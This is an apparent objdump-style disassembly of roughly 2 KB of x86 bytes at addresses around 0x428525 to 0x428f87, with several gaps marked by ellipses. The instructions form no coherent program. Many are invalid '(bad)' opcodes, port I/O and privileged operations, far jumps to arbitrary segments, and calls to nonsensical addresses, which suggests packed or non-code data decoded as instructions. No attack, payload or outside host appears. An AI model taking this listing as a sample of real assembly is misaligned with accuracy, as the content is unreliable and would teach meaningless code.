  428525:	sub    dh,BYTE PTR [ecx]
  428527:	push   esi
  428528:	mov    al,0x2a
  42852a:	lahf   
  42852b:	iret   
  42852c:	faddp  st(1),st
  42852e:	xchg   DWORD PTR [esi],eax
  428530:	sbb    eax,DWORD PTR ds:0xda83ec71
  428536:	add    BYTE PTR ds:0xbb9d77c6,0xf6
  42853d:	shl    BYTE PTR [ebx-0x76],1
  428540:	pop    ecx
  428541:	xor    dl,BYTE PTR [esi]
  428543:	or     BYTE PTR [ebx+0x3a],dh
  428546:	imul   esi,DWORD PTR [ebx-0x40],0x4f
  42854a:	cld    
  42854b:	cmp    eax,esi
  42854d:	stc    
  42854e:	jnp    0x428501
  428550:	mov    ecx,0x464cf8c4
  428555:	pop    ebx
  428556:	out    0x7e,al
  428558:	sub    DWORD PTR [edi],edx
  42855a:	push   eax
  42855b:	int3   
  42855c:	add    al,0xb4
  42855e:	data16 in al,dx
  428560:	jo     0x428543
  428562:	push   ecx
  428563:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428564:	adc    DWORD PTR [eax+0x4193dcec],eax
  42856a:	stc    
  42856b:	cmp    eax,0xfe352902
  428570:	mov    BYTE PTR [ebx],cl
  428572:	ins    DWORD PTR es:[edi],dx
  428573:	call   0x23fac370
  428578:	jmp    0x42854e
  42857a:	mov    ecx,eax
  42857c:	enter  0xf2d9,0x53
  428580:	jmp    0xce30:0xd11fe9d3
  428587:	sub    DWORD PTR [edi],esp
  428589:	call   esp
  42858b:	adc    DWORD PTR [ebx+0x414f712d],0x0
	...
  4285f1:	add    BYTE PTR [eax],al
  4285f3:	add    BYTE PTR [ecx-0xa],dl
  4285f6:	xor    eax,0x5bffb73e
  4285fb:	inc    edi
  4285fd:	mov    esi,0x52ada3f6
  428602:	dec    eax
  428603:	pusha  
  428604:	push   ds
  428605:	mov    al,0x1
  428607:	add    BYTE PTR ds:0x1f000001,al
  42860d:	(bad)  
  42860e:	cmp    DWORD PTR [edx],esi
  428610:	aaa    
  428611:	mov    eax,ds:0x587316db
  428616:	in     al,0xf9
  428618:	in     al,0xf5
  42861a:	retf   
  42861b:	hlt    
  42861c:	xor    al,0x1b
  42861e:	cmp    BYTE PTR [ecx-0x797ffe60],cl
  428624:	aaa    
  428625:	(bad)  
  428626:	push   ds
  428627:	jp     0x4285cd
  428629:	cmp    DWORD PTR [eax+ebx*1+0x7e],edi
  42862d:	shl    eax,1
  42862f:	lock add eax,0xe281ba56
  428635:	daa    
  428636:	(bad)  
  428637:	test   al,0x7
  428639:	inc    edx
  42863a:	das    
  42863b:	or     eax,0x8d872539
  428640:	xchg   edi,eax
  428641:	imul   eax
  428643:	mov    ch,al
  428645:	mov    dl,0xa9
  428647:	arpl   WORD PTR [edx],ax
  428649:	in     al,0xd4
  42864b:	call   0xc87e:0x6ab2cd06
  428652:	mov    gs,WORD PTR [eax]
  428654:	fisttp QWORD PTR [ebx-0x32]
  428657:	jnp    0x4286bf
  428659:	sti    
  42865a:	push   es
  42865b:	mov    ds:0x9125a0f4,eax
  428660:	aam    0x64
  428662:	jmp    0x80ac:0x793ccf6c
  428669:	jmp    0xab0b:0xfed46910
  428670:	dec    ecx
  428671:	adc    al,BYTE PTR [ecx+0x5b]
  428674:	xchg   DWORD PTR [eax],ebp
  428676:	fadd   st,st(2)
  428678:	sub    al,0x10
  42867a:	pop    ebx
  42867b:	daa    
  42867c:	dec    esi
  42867d:	loop   0x4286eb
  42867f:	and    al,0x1d
  428681:	in     eax,0x9e
  428683:	mov    edx,0x2f40a71f
  428688:	xchg   DWORD PTR [eax-0x5c],esi
  42868b:	iret   
  42868c:	out    0x44,eax
  42868e:	iret   
  42868f:	push   es
  428690:	cwde   
  428691:	push   ss
  428692:	adc    BYTE PTR [ebx+0x12],0xcd
  428696:	inc    esi
  428697:	test   al,0xaa
  428699:	dec    ecx
  42869a:	cmp    esi,ecx
  42869c:	inc    ebp
  42869d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42869e:	push   edx
  42869f:	(bad)  
  4286a0:	push   cs
  4286a1:	jb     0x42871b
  4286a3:	aad    0x30
  4286a5:	sub    al,0x14
  4286a7:	repnz xor ebp,esi
  4286aa:	imul   eax,eax,0x43
  4286ad:	fld    DWORD PTR [ebp-0x31]
  4286b0:	dec    ebp
  4286b1:	jbe    0x42865d
  4286b3:	sbb    ebx,DWORD PTR [eax-0x2337d8e7]
  4286b9:	pop    ecx
  4286ba:	push   edi
  4286bb:	scas   eax,DWORD PTR es:[edi]
  4286bc:	sahf   
  4286bd:	mov    edx,0x86e0ba74
  4286c2:	in     al,0x40
  4286c4:	xor    eax,DWORD PTR [ebx+eiz*1+0x30]
  4286c8:	outs   dx,BYTE PTR ds:[esi]
  4286c9:	sub    eax,0x6aa40316
  4286ce:	je     0x428737
  4286d0:	xor    eax,0xf8a07750
  4286d5:	xchg   edx,eax
  4286d6:	mov    WORD PTR [ecx+0x6c],ss
  4286d9:	hlt    
  4286da:	das    
  4286db:	stc    
  4286dc:	js     0x4286d0
  4286de:	test   ebx,0x381ff342
  4286e4:	and    BYTE PTR [edx-0x64a9e059],bl
  4286ea:	ds pop eax
  4286ec:	push   esi
  4286ed:	mov    ebp,ss
  4286ef:	dec    ecx
  4286f0:	xchg   ebx,eax
  4286f1:	xchg   edx,eax
  4286f2:	or     eax,0xdc2afee3
  4286f7:	push   edx
  4286f8:	fxch   st(0)
  4286fa:	pop    ebp
  4286fb:	and    DWORD PTR [esi-0x3e],ebp
  4286fe:	test   cl,ch
  428700:	sbb    edx,0xffffffca
  428703:	cmp    esp,DWORD PTR [esi+eax*8+0x44cf68bf]
  42870a:	and    ebp,DWORD PTR [edx]
  42870c:	fstp   TBYTE PTR [ecx+0x36e397]
	...
  428772:	add    BYTE PTR [eax],al
  428774:	push   esi
  428775:	pop    ebx
  428776:	xor    al,0x78
  428778:	cmp    eax,0xe77f5e7f
  42877d:	inc    ebp
  42877e:	call   0x89e8896
  428783:	lock and esi,DWORD PTR [ecx+0x1050001]
  42878a:	add    BYTE PTR [eax],al
  42878c:	jb     0x42880d
  42878e:	cmp    BYTE PTR ds:0x85d54c51,al
  428794:	xor    eax,0xd0cba5aa
  428799:	stc    
  42879a:	inc    edx
  42879b:	jo     0x428721
  42879d:	rcl    al,0x93
  4287a0:	iret   
  4287a1:	add    eax,0xf7a31086
  4287a6:	mov    al,0x29
  4287a8:	pop    edx
  4287a9:	inc    edx
  4287aa:	dec    edi
  4287ab:	pop    ds
  4287ac:	xchg   esp,eax
  4287ad:	into   
  4287ae:	xor    dh,bl
  4287b0:	(bad)  
  4287b2:	pop    ss
  4287b3:	inc    ebp
  4287b4:	cmp    eax,DWORD PTR [eax-0x1b434dab]
  4287ba:	shr    BYTE PTR [edi+0x7690db18],0x9d
  4287c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4287c2:	cmp    eax,0xb8667094
  4287c7:	(bad)
  4287cb:	and    esi,esp
  4287cd:	mov    ah,0x34
  4287d0:	imul   ebx,ebx,0x28114c24
  4287d6:	xchg   BYTE PTR ds:0x56882f4a,dh
  4287dc:	and    al,BYTE PTR [ecx]
  4287de:	sbb    DWORD PTR [esi+0x79],0x37
  4287e2:	cmp    BYTE PTR [eax-0x2f989f7],ch
  4287e8:	jmp    0x4287cd
  4287ea:	scas   eax,DWORD PTR es:[edi]
  4287eb:	arpl   di,si
  4287ed:	clc    
  4287ee:	add    eax,0x3e883479
  4287f3:	inc    ebx
  4287f4:	fidivr WORD PTR ds:0xf87765c3
  4287fa:	adc    eax,0x872d65d9
  4287ff:	xchg   DWORD PTR [edx+0x62],ebp
  428802:	stc    
  428803:	lea    ebx,[ecx-0x67be4e4]
  428809:	mov    dl,0xe
  42880b:	cli    
  42880c:	sti    
  42880d:	call   0x2b38581e
  428812:	shr    BYTE PTR [ebp-0x2d3ed8cb],0xac
  428819:	idiv   esi
  42881b:	pop    edx
  42881c:	or     BYTE PTR [edx],cl
  42881e:	jne    0x428893
  428820:	lods   al,BYTE PTR ds:[esi]
  428821:	jbe    0x42889f
  428823:	mov    dh,BYTE PTR [edx]
  428825:	xlat   BYTE PTR ds:[ebx]
  428826:	add    edx,DWORD PTR [edx]
  428828:	mov    cl,0x34
  42882a:	and    al,0xce
  42882c:	mov    eax,0xcfe16f85
  428831:	or     cl,ah
  428833:	jp     0x42888e
  428835:	into   
  428836:	scas   al,BYTE PTR es:[edi]
  428837:	xor    ah,dh
  428839:	adc    BYTE PTR [eax+0x452fbd0d],al
  42883f:	cwde   
  428840:	pop    edx
  428841:	adc    ebx,DWORD PTR ds:0x30663519
  428847:	inc    esi
  428848:	retf   0x77c7
  42884b:	popa   
  42884c:	sub    DWORD PTR [ecx+0x4b38fe51],0xffffffcf
  428853:	loop   0x428888
  428855:	cmp    al,0x37
  428857:	js     0x42882a
  428859:	jmp    0x25a2:0xd38cfbc0
  428860:	xor    dl,BYTE PTR [ecx+0x15]
  428863:	sub    esi,DWORD PTR [ecx-0x3078a35b]
  428869:	dec    edx
  42886a:	cld    
  42886b:	xor    BYTE PTR [ebx],0x75
  42886e:	in     eax,0x12
  428870:	lea    esp,[edi+0x201b93b9]
  428876:	inc    ebx
  428877:	xor    esi,edi
  428879:	rcr    ebp,cl
  42887b:	xchg   ebx,eax
  42887c:	and    al,0x45
  42887e:	fsubr  st(0),st
  428880:	adc    eax,0xc65253ea
  428885:	fidiv  DWORD PTR [esp+eax*8-0x5f]
  428889:	mov    edx,ecx
  42888b:	iret   
  42888c:	les    ebp,FWORD PTR [edx-0x6a]
  42888f:	and    ch,ch
	...
  4288f1:	add    BYTE PTR [eax],al
  4288f3:	add    BYTE PTR [esi],ah
  4288f5:	jp     0x428968
  4288f7:	les    edi,FWORD PTR [ebp-0x31]
  4288fa:	mov    bh,0xfa
  4288fc:	arpl   WORD PTR [esi-0x432962f1],bx
  428902:	aad    0x57
  428904:	sub    BYTE PTR [edx+0x1050001],dh
  42890a:	add    BYTE PTR [eax],al
  42890c:	ret    0x823
  42890f:	aaa    
  428910:	in     al,0x70
  428912:	(bad)  
  428913:	cmp    ebp,DWORD PTR [edi+0x3d7f1b75]
  428919:	addr16 cdq 
  42891b:	pushf  
  42891c:	js     0x42891f
  42891e:	fild   DWORD PTR [ebx+edi*1+0x56]
  428922:	xchg   BYTE PTR [eax+0x1d],ch
  428925:	push   es
  428926:	(bad)  
  428927:	sar    BYTE PTR [ecx+0x76],0xfc
  42892b:	add    BYTE PTR [ebx+ebx*1+0x2d],cl
  42892f:	arpl   WORD PTR [edi],bx
  428931:	fcmovne st,st(1)
  428933:	pop    es
  428934:	sti    
  428935:	int    0xb5
  428937:	jae    0x4288e8
  428939:	push   edi
  42893a:	test   eax,0xe45165ad
  42893f:	or     al,0x1b
  428941:	mov    al,0xab
  428943:	or     al,0x88
  428945:	dec    ecx
  428946:	jnp    0x428941
  428948:	cli    
  428949:	push   ebx
  42894a:	or     BYTE PTR ss:[edx+0x710201e8],0x5a
  428952:	and    bl,BYTE PTR [esi]
  428954:	sbb    al,0xc2
  428956:	sub    ebx,DWORD PTR fs:0x63620ed1
  42895d:	lahf   
  42895e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42895f:	sbb    ebp,DWORD PTR [edi]
  428961:	mov    eax,0x82aeb234
  428966:	adc    al,0x25
  428968:	mov    eax,0xf2448fad
  42896d:	fistp  QWORD PTR [esp+ecx*1]
  428970:	out    0x54,al
  428972:	ret    
  428973:	and    DWORD PTR [ecx-0x36],ebp
  428976:	xchg   DWORD PTR [ebp-0x14e5888],ebp
  42897c:	jge    0x428917
  42897e:	je     0x42895a
  428980:	sub    eax,0xc8e0da6c
  428985:	dec    eax
  428986:	test   BYTE PTR [edx+0x3af05ab1],ah
  42898c:	sbb    dl,BYTE PTR [ebx]
  42898e:	imul   eax,DWORD PTR [ebx+0x13590e30],0xffffff97
  428995:	mov    edx,0x2fab286f
  42899a:	dec    ebp
  42899b:	jne    0x428982
  42899d:	dec    ebp
  42899e:	outs   dx,DWORD PTR ds:[esi]
  42899f:	xchg   esp,eax
  4289a0:	inc    eax
  4289a1:	imul   ebx,DWORD PTR [eax],0xe4610c54
  4289a7:	cmp    DWORD PTR [edi],0x49
  4289aa:	lock xchg ecx,eax
  4289ac:	pop    ebp
  4289ad:	clc    
  4289ae:	sub    eax,0x424f9193
  4289b3:	sbb    BYTE PTR [esi+0x77],ch
  4289b6:	sbb    ah,al
  4289b8:	ins    DWORD PTR es:[edi],dx
  4289b9:	or     esi,esi
  4289bb:	adc    DWORD PTR ds:0x919bc71c,edi
  4289c1:	cld    
  4289c2:	out    0xcb,eax
  4289c4:	hlt    
  4289c5:	fnstenv [edi+0x7]
  4289c8:	popa   
  4289c9:	sbb    eax,0x34d5b4ec
  4289ce:	sub    esp,DWORD PTR [esi-0x9]
  4289d1:	ds xor al,0xb
  4289d4:	jg     0x428988
  4289d6:	inc    ecx
  4289d7:	mov    eax,?
  4289d9:	sub    ecx,DWORD PTR [edi+ebp*8]
  4289dc:	xor    al,0x5d
  4289de:	add    DWORD PTR [ebx+0x2d07cb32],ecx
  4289e4:	lods   eax,DWORD PTR ds:[esi]
  4289e5:	lds    edx,FWORD PTR [edi]
  4289e7:	cmp    edx,DWORD PTR [ebx+edx*1-0x36d48cb9]
  4289ee:	push   ebx
  4289ef:	clc    
  4289f0:	lea    ebx,[esi+0x2ea73635]
  4289f6:	sub    ch,BYTE PTR [eax-0x2872b38c]
  4289fc:	out    0x1a,eax
  4289fe:	sbb    esp,DWORD PTR [ebx+0x7146286f]
  428a04:	aas    
  428a05:	xchg   edx,eax
  428a06:	cdq    
  428a07:	sub    ecx,DWORD PTR [edx]
  428a09:	retf   
  428a0a:	ror    dh,1
  428a0c:	addr16 sti 
  428a0e:	push   eax
  428a0f:	jo     0x428991
	...
  428a71:	add    BYTE PTR [eax],al
  428a73:	add    BYTE PTR [ebp+0xc],cl
  428a76:	clc    
  428a77:	pop    ebx
  428a78:	stc    
  428a79:	(bad)  
  428a7a:	out    dx,eax
  428a7b:	push   ds
  428a7c:	pop    ds
  428a7d:	bound  edx,QWORD PTR [eax-0x6606f1ed]
  428a83:	fild   QWORD PTR ds:0x50001b3
  428a89:	add    DWORD PTR [eax],eax
  428a8b:	add    BYTE PTR [eax+0x8],dl
  428a8e:	jb     0x428a5c
  428a90:	push   ebp
  428a91:	jmp    DWORD PTR [edi-0x3ab15962]
  428a97:	pusha  
  428a98:	stos   BYTE PTR es:[edi],al
  428a99:	mov    dl,0xaa
  428a9b:	int    0x1
  428a9d:	dec    edi
  428a9e:	rcr    dl,cl
  428aa0:	jbe    0x428abe
  428aa2:	mov    WORD PTR [edi-0x587ace2],gs
  428aa8:	xor    DWORD PTR [ebx-0x55aa48e6],ebx
  428aae:	mov    edx,0x8311ba57
  428ab3:	nop
  428ab4:	inc    ebx
  428ab5:	out    dx,eax
  428ab6:	lea    eax,[ebx-0x5c9ff57d]
  428abc:	jnp    0x428af0
  428abe:	fdiv   QWORD PTR [ebx-0x1d3f6394]
  428ac4:	sub    BYTE PTR [esp+esi*2+0x17],ah
  428ac8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428ac9:	retf   
  428aca:	add    ecx,DWORD PTR ds:0xc655ebf8
  428ad0:	xchg   esp,eax
  428ad1:	xor    BYTE PTR [ebx-0xa9299f2],al
  428ad7:	sahf   
  428ad8:	adc    al,0xa2
  428ada:	imul   esi,DWORD PTR [ecx+edx*8-0x32],0xf90fcd75
  428ae2:	aam    0x6b
  428ae4:	retf   
  428ae5:	add    esi,esi
  428ae7:	sub    ebx,edx
  428ae9:	mov    al,0x58
  428aeb:	jo     0x428b56
  428aed:	retf   0x12a3
  428af0:	(bad)  
  428af1:	xchg   esi,eax
  428af2:	xor    DWORD PTR [ebx-0x5a],eax
  428af5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428af6:	test   al,bh
  428af8:	aas    
  428af9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428afa:	std    
  428afb:	mov    ah,0x5c
  428afd:	test   eax,0xda81cfb2
  428b02:	imul   ebx
  428b04:	and    BYTE PTR [ebp+0x2],ah
  428b07:	into   
  428b08:	adc    edi,DWORD PTR [esi]
  428b0a:	push   esp
  428b0b:	and    al,0x19
  428b0d:	sbb    DWORD PTR [eax],ebp
  428b0f:	movmskps ebx,xmm4
  428b12:	leave  
  428b13:	scas   eax,DWORD PTR es:[edi]
  428b14:	or     al,0x39
  428b16:	ret    0xf283
  428b19:	stc    
  428b1a:	pushf  
  428b1b:	jecxz  0x428b7c
  428b1d:	shl    ebp,0xfc
  428b20:	jbe    0x428b14
  428b22:	mov    ecx,DWORD PTR [eax-0x76]
  428b25:	jne    0x428ae4
  428b27:	pop    es
  428b28:	ror    DWORD PTR [edi+0xd85b6e2],cl
  428b2e:	jo     0x428b9a
  428b30:	mov    cl,0xb9
  428b32:	push   cs
  428b33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428b34:	sti    
  428b35:	test   DWORD PTR [esi-0x77cecb66],0xcf24c1ee
  428b3f:	loop   0x428b0b
  428b41:	out    0xeb,al
  428b43:	sbb    al,0x58
  428b45:	test   DWORD PTR [ebx+0x3],edx
  428b48:	cs pushf 
  428b4a:	xchg   esi,eax
  428b4b:	xor    esp,esi
  428b4d:	pop    esi
  428b4e:	les    ebp,FWORD PTR [eax-0x69f7b52c]
  428b54:	rcl    BYTE PTR ds:0x4a84c9a4,cl
  428b5a:	adc    eax,0xafc4710
  428b5f:	push   esp
  428b60:	dec    esi
  428b61:	xchg   BYTE PTR [ebp-0x5c],dh
  428b64:	pop    ebp
  428b65:	pop    esi
  428b66:	mov    edi,0x7b171727
  428b6b:	jmp    0x428bc1
  428b6d:	pop    ebx
  428b6e:	cmp    BYTE PTR ds:0xd28b14a4,ah
  428b74:	loope  0x428b7d
  428b76:	mov    ah,0x7c
  428b78:	dec    edi
  428b79:	mov    ?,eax
  428b7b:	(bad)  
  428b7c:	adc    BYTE PTR [ebx+0x76],al
  428b7f:	sti    
  428b80:	sub    DWORD PTR [esi-0x594c51a2],esi
  428b86:	rcl    edi,1
  428b88:	dec    eax
  428b89:	mov    ds:0x2ea1f4d5,eax
  428b8e:	pop    edx
  428b8f:	push   edi
  428b90:	aaa    
	...
  428bf1:	add    BYTE PTR [eax],al
  428bf3:	add    ch,al
  428bf5:	push   ebp
  428bf6:	mov    bh,dl
  428bf8:	call   0xbbc:0x947ff5ff
  428bff:	push   0x1460a1b6
  428c04:	xor    dh,BYTE PTR [ecx+eax*1+0x10500]
  428c0b:	add    BYTE PTR [eax-0x7c],ah
  428c0e:	sahf   
  428c0f:	add    DWORD PTR ds:0x5ece2717,esp
  428c16:	clc    
  428c17:	and    al,0x6d
  428c19:	xchg   edi,eax
  428c1a:	dec    edi
  428c1b:	sbb    DWORD PTR [ecx+0x5576e755],esp
  428c21:	cmp    eax,0x33024989
  428c26:	mov    ds:0xd2c7cacd,eax
  428c2b:	lods   al,BYTE PTR ds:[esi]
  428c2c:	hlt    
  428c2d:	push   ebx
  428c2e:	push   ebp
  428c2f:	or     dh,BYTE PTR es:[ebp+eax*2-0x71b48c8]
  428c37:	js     0x428bf1
  428c39:	retf   0x844d
  428c3c:	(bad)  
  428c3d:	jle    0x428bc8
  428c3f:	sub    al,0xb
  428c41:	rol    DWORD PTR [esi-0x46],1
  428c44:	popf   
  428c45:	pop    edx
  428c46:	jbe    0x428c68
  428c48:	sahf   
  428c49:	push   esp
  428c4a:	mov    ebp,0x210a44e
  428c4f:	or     ah,BYTE PTR [ebp-0xe]
  428c52:	inc    esi
  428c53:	ds jmp 0x428c70
  428c56:	adc    DWORD PTR [ecx],esi
  428c58:	fsubr  QWORD PTR ds:[edi-0x5c]
  428c5c:	ds mov cl,0x24
  428c5f:	jo     0x428c5d
  428c61:	sbb    ecx,DWORD PTR [esi+0x7b227e38]
  428c67:	test   dh,bl
  428c69:	pop    ebp
  428c6a:	(bad)  
  428c6c:	sbb    eax,0x298d7b69
  428c71:	repz sbb al,0x3b
  428c74:	mov    cl,0xf3
  428c76:	pop    esi
  428c77:	add    eax,0xbfde3f12
  428c7c:	adc    ah,BYTE PTR [ebx]
  428c7e:	div    eax
  428c80:	daa    
  428c81:	add    ah,BYTE PTR [edi+esi*1]
  428c84:	jbe    0x428c09
  428c86:	adc    eax,0x3dbb7e75
  428c8b:	repz mov dl,0x80
  428c8e:	jae    0x428cb6
  428c90:	or     eax,0xcf1d0419
  428c95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428c96:	mov    ah,0x58
  428c98:	scas   eax,DWORD PTR es:[edi]
  428c99:	aam    0xe6
  428c9b:	and    BYTE PTR [ebx-0x62],ah
  428c9e:	popa   
  428c9f:	pop    esi
  428ca0:	rcr    DWORD PTR [ebp+eax*2-0x78],1
  428ca4:	mov    ecx,0xbb36e04a
  428ca9:	into   
  428caa:	popf   
  428cab:	out    dx,eax
  428cac:	inc    ebp
  428cad:	sbb    DWORD PTR [ebx-0xd],esp
  428cb0:	ret    
  428cb1:	out    0x89,eax
  428cb3:	pop    ss
  428cb4:	jmp    0xe73f:0xf0daa322
  428cbb:	fcmovu st,st(2)
  428cbd:	mov    ds:0x2b045a8a,al
  428cc2:	(bad)  
  428cc3:	push   ds
  428cc4:	add    al,0xe9
  428cc6:	cld    
  428cc7:	pusha  
  428cc8:	sar    edx,cl
  428cca:	outs   dx,DWORD PTR ds:[esi]
  428ccb:	push   ds
  428ccc:	fadd   QWORD PTR [eax]
  428cce:	into   
  428ccf:	pop    eax
  428cd0:	in     eax,dx
  428cd1:	cmp    esp,0x6e1a798f
  428cd7:	clc    
  428cd8:	call   0xd0756da0
  428cdd:	outs   dx,DWORD PTR ds:[esi]
  428cde:	mov    ch,0xec
  428ce0:	fdiv   st(6),st
  428ce2:	dec    ebp
  428ce3:	sbb    BYTE PTR [eax+ebp*1],bl
  428ce6:	arpl   WORD PTR [eax],bp
  428ce8:	lods   al,BYTE PTR ds:[esi]
  428ce9:	add    esi,DWORD PTR [ebx+0x6d15193b]
  428cef:	ror    DWORD PTR [edx-0xbeaa728],0xaa
  428cf6:	cwde   
  428cf7:	sub    DWORD PTR [ebx+edi*4+0xde13dc8],esi
  428cfe:	mov    ?,WORD PTR [ebx+0x1d]
  428d01:	and    eax,DWORD PTR [edx-0x33]
  428d04:	mov    DWORD PTR [edi],eax
  428d06:	cmp    DWORD PTR [edi-0x65],0xffffff9d
  428d0a:	or     al,0xbc
  428d0c:	xor    eax,0xf245d687
	...
  428d71:	add    BYTE PTR [eax],al
  428d73:	add    BYTE PTR [ecx-0xace0e4b],al
  428d79:	jne    0x428d3c
  428d7b:	mov    ch,0x90
  428d7d:	int3   
  428d7e:	ins    BYTE PTR es:[edi],dx
  428d7f:	retf   0x6d9d
  428d82:	dec    esi
  428d83:	daa    
  428d84:	aaa    
  428d85:	mov    ch,0x1
  428d87:	add    BYTE PTR ds:0x52000001,al
  428d8d:	div    BYTE PTR [eax+0x55bada1d]
  428d93:	mov    esi,DWORD PTR [edi]
  428d95:	and    edi,esp
  428d97:	xchg   DWORD PTR [ebx],ecx
  428d99:	and    DWORD PTR [edx-0x44],edx
  428d9c:	push   ecx
  428d9d:	leave  
  428d9e:	cmp    BYTE PTR [edi],al
  428da0:	hlt    
  428da1:	dec    ebx
  428da2:	mov    ebx,0x43c40f07
  428da7:	inc    eax
  428da8:	xlat   BYTE PTR ds:[ebx]
  428da9:	xchg   esp,eax
  428daa:	push   eax
  428dab:	jmp    ebx
  428dad:	pop    ebp
  428dae:	xchg   ebx,eax
  428daf:	sar    BYTE PTR [ebx+0x77],cl
  428db2:	mov    ebp,0xc9ce3056
  428db7:	pop    ss
  428db8:	pop    edi
  428db9:	gs pop edx
  428dbb:	fdivr  st,st(6)
  428dbd:	mov    DWORD PTR [ebx+ebx*1],edx
  428dc0:	(bad)  
  428dc1:	rol    BYTE PTR [ebx],1
  428dc3:	mov    edi,0xbf8a7861
  428dc8:	push   eax
  428dc9:	sbb    edi,edi
  428dcb:	cmp    BYTE PTR [eax+edx*2+0x3ceee71e],dh
  428dd2:	es or  al,0xfb
  428dd5:	(bad)  
  428dd6:	fmul   QWORD PTR [esi+0x55]
  428dd9:	loop   0x428dd4
  428ddb:	push   ecx
  428ddc:	sbb    eax,0x6a5fb14c
  428de1:	xor    al,0xfe
  428de3:	fld    st(2)
  428de5:	popa   
  428de6:	xor    DWORD PTR ds:0x18b1000f,edx
  428dec:	cmp    ah,BYTE PTR [ecx-0x4bc073d9]
  428df2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428df3:	cmp    al,0x54
  428df5:	or     BYTE PTR [edx+0x363bfa54],ah
  428dfb:	sti    
  428dfc:	loope  0x428e4b
  428dfe:	out    0xdf,eax
  428e00:	pop    edi
  428e01:	mov    ecx,0x89955b83
  428e06:	int    0xad
  428e08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428e09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428e0a:	dec    edx
  428e0b:	mov    ds,WORD PTR [ebx+0xcd63e96]
  428e11:	push   ebx
  428e12:	je     0x428da1
  428e14:	arpl   bx,bp
  428e16:	push   0xa02c810e
  428e1b:	pop    esp
  428e1c:	mov    BYTE PTR [ebx],cl
  428e1e:	and    DWORD PTR ds:0xaee757ea,0x13295448
  428e28:	inc    ecx
  428e2a:	adc    cl,al
  428e2c:	adc    BYTE PTR [edx-0x4038f901],al
  428e32:	ins    BYTE PTR es:[edi],dx
  428e33:	or     BYTE PTR [eax-0x1],dl
  428e36:	test   ebx,edi
  428e38:	dec    esp
  428e39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428e3a:	push   esp
  428e3b:	stos   BYTE PTR es:[edi],al
  428e3c:	or     al,0xe4
  428e3e:	jge    0x428e67
  428e40:	pop    ecx
  428e41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428e42:	xor    BYTE PTR [eax],cl
  428e44:	bound  ebp,QWORD PTR [esi]
  428e46:	sahf   
  428e47:	stc    
  428e48:	push   edx
  428e49:	sbb    DWORD PTR [eax+esi*8],edx
  428e4c:	inc    eax
  428e4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428e4e:	sub    dl,BYTE PTR [edi-0x4e]
  428e51:	sti    
  428e52:	or     al,0x1c
  428e54:	jp     0x428ea6
  428e56:	mov    ebp,0x9b04802
  428e5b:	addr16 in al,dx
  428e5d:	xchg   ebp,eax
  428e5e:	imul   esi,ebx,0xc6f0eb6e
  428e64:	dec    ecx
  428e65:	adc    DWORD PTR [ebx-0x5ca6badc],0xcca62ed0
  428e6f:	sub    eax,0x8baeef7f
  428e74:	cmp    edx,edi
  428e76:	add    eax,0x30dc50ff
  428e7b:	and    al,0x2a
  428e7d:	sti    
  428e7e:	cli    
  428e7f:	mov    ecx,0x83c81a2b
  428e84:	iret   
  428e85:	pop    dx
  428e87:	out    0x2c,eax
  428e89:	add    DWORD PTR [ecx-0x2f],0x38
  428e8d:	dec    eax
  428e8e:	dec    esi
  428e8f:	addr16 xchg esi,eax
	...
  428ef1:	add    BYTE PTR [eax],al
  428ef3:	add    BYTE PTR [edi+0x5d],cl
  428ef6:	pop    ecx
  428ef7:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428efb:	fstp   st(1)
  428efd:	ror    DWORD PTR [esp+edx*4],0x6e
  428f01:	shr    bl,1
  428f03:	dec    esp
  428f04:	cmp    al,0xb6
  428f06:	add    DWORD PTR [eax],eax
  428f08:	add    eax,0x85000001
  428f0d:	cld    
  428f0e:	and    al,0x30
  428f10:	cmp    BYTE PTR [esi-0x65],ah
  428f13:	hlt    
  428f14:	push   es
  428f15:	ror    BYTE PTR [edi-0x15109c],0xe5
  428f1c:	push   ds
  428f1d:	in     al,0x82
  428f1f:	stos   DWORD PTR es:[edi],eax
  428f20:	mov    ebx,0xbab49ac1
  428f25:	mov    ecx,0x91329111
  428f2a:	dec    esp
  428f2b:	mov    al,0x9b
  428f2d:	lahf   
  428f2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428f2f:	dec    esp
  428f30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428f31:	mov    esi,0xf19044d7
  428f36:	fisttp QWORD PTR [esi+0x2a]
  428f39:	(bad)  
  428f3a:	(bad)  
  428f3c:	cdq    
  428f3d:	inc    esi
  428f3e:	mov    DWORD PTR ds:0x2de25256,ecx
  428f44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428f45:	sbb    al,0x49
  428f47:	rcr    cl,1
  428f49:	cs adc al,0x5a
  428f4c:	gs mov dl,0x61
  428f4f:	mov    esi,0xe388c12d
  428f54:	or     DWORD PTR [eax],0xffffffbf
  428f57:	mov    esp,0x9628e68b
  428f5c:	loop   0x428f8c
  428f5e:	pop    esp
  428f5f:	dec    edx
  428f60:	mov    bh,0xd5
  428f62:	push   esi
  428f63:	imul   edi,DWORD PTR [edx-0x22],0xffffffa4
  428f67:	adc    bl,ch
  428f69:	ja     0x428fa8
  428f6b:	sub    al,BYTE PTR [ecx]
  428f6d:	sub    cl,ah
  428f6f:	xchg   DWORD PTR [ebp-0x45207708],ebx
  428f75:	mov    dh,0x81
  428f77:	or     DWORD PTR [ebx-0x6],edi
  428f7a:	inc    edx
  428f7b:	mov    ah,0x4f
  428f7d:	arpl   WORD PTR [edx+0x3cbd0970],bp
  428f83:	cmp    BYTE PTR [edx],bh
  428f85:	jge    0x429000
  428f87:	xlat   BYTE PTR ds:[ebx]
